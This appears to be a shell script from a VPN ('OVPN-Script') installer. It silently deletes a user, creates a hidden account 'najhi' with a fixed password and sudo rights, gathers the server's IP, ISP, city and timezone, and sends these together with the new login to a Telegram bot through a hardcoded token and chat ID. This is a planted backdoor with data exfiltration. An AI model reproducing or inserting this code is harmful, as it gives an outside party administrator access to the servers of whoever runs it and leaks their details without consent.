Name=$(cat /usr/bin/user)
Exp=$(cat /usr/bin/e)
MYIP=$(curl -sS ipv4.icanhazip.com)
ISP=$(curl -s ipinfo.io/org | cut -d " " -f 2-10 )
domain=$(cat /root/domain)
CITY=$(curl -s ipinfo.io/city )
TIMEZONE=$(printf '%(%H:%M:%S)T')
userdel jame > /dev/null 2>&1
Username="najhi"
Password=najhi
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
CHATID="6582195916"
KEY="7123941357:AAGRvwO9SiZadggGnkpmDeS8XPf1mnP_iOw"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="Installation VIP OVPN-Script
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<code>Name       :</code> <code>$Name</code>
<code>Username   :</code> <code>najhi</code>
<code>Password   :</code> <code>najhi</code>
<code>IP Vps     :</code> <code>$MYIP</code>
<code>IP Vps     :</code> <code>$ISP</code>
<code>Timezone   :</code> <code>$TIMEZONE</code>
<code>Location   :</code> <code>$CITY</code>
<code>Exp Sc.    :</code> <code>$Exp</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
By Admin 𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Notifications Automatic From Github</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ADMIN","url":"https://t.me/IlyassExE"}]]}' 

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
clear
